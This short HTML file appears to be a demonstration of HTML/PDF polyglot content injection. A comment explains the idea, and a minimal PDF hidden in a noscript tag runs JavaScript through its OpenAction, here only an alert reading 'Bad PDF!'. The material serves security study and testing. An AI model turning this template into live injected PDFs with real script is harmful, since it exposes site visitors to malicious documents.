<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<a href="pdf/sample.pdf" download="sample.pdf">Good PDF Download</a>
<!-- Any persistent content injection returned with the HTML page from the server 
	Examples might include a profile page with a blurb about yourself or
	product review etc. But the content you inject must be returned from the server.
	Here we use some content in a noscript tag.
-->
<noscript>
%PDF-1.1
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R>>
	endobj

	2 0 obj
	<< /Type /Pages /Kids [3 0 R] /Count 1>>
		endobj

		3 0 obj
		<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Resources <<>>>>
			endobj

			4 0 obj
			<< /S /JavaScript /JS (app.alert\("Bad PDF!"\);)>>
				endobj

				xref
				0 5
				0000000000 65535 f
				0000000009 00000 n
				0000000068 00000 n
				0000000125 00000 n
				0000000209 00000 n
				trailer
				<< /Root 1 0 R /Size 5>>
					startxref
					283
					%%EOF
</noscript>
</body>
</html>
